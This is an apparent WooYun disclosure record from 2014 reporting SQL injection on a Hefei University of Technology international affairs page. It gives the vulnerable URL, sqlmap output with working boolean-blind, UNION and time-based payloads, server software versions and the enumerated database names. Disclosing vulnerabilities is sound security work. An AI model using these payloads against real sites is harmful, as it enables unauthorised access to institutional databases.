wybug_title: 合肥工业大学国际事务部sql注入一枚
wybug_status: 已交由第三方合作机构(CCERT教育网应急响应组)处理
wybug_detail: 漏洞详情 披露状态：   									2014-08-29：	细节已通知厂商并且等待厂商处理中									2014-09-03：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 网站存在注入点 详细说明：  注入点：http://international.hfut.edu.cn/content_view.php?ID=861   漏洞证明：  sqlmap identified the following injection points with a total of 53 HTTP(s) requests:---Place: GETParameter: ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ID=861' AND 5861=5861 AND 'ZyFv'='ZyFv    Type: UNION query    Title: MySQL UNION query (NULL) - 13 columns    Payload: ID=-1638' UNION ALL SELECT NULL,NULL,CONCAT(0x7179706271,0x444d42764a7151784c48,0x716f6c7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: ID=861' AND SLEEP(5) AND 'TkUf'='TkUf---web server operating system: Linux Debian 6.0 (squeeze)web application technology: PHP 5.3.3, Apache 2.2.16back-end DBMS: MySQL 5.0.11sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ID=861' AND 5861=5861 AND 'ZyFv'='ZyFv    Type: UNION query    Title: MySQL UNION query (NULL) - 13 columns    Payload: ID=-1638' UNION ALL SELECT NULL,NULL,CONCAT(0x7179706271,0x444d42764a7151784c48,0x716f6c7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: ID=861' AND SLEEP(5) AND 'TkUf'='TkUf---web server operating system: Linux Debian 6.0 (squeeze)web application technology: PHP 5.3.3, Apache 2.2.16back-end DBMS: MySQL 5.0.11available databases [2]:[*] `information_schema\t`[*] c223gjhzc   修复方案：  过滤   版权声明：转载请注明来源 灰太_狼@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-09-03 12:10 厂商回复：  最新状态： 暂无
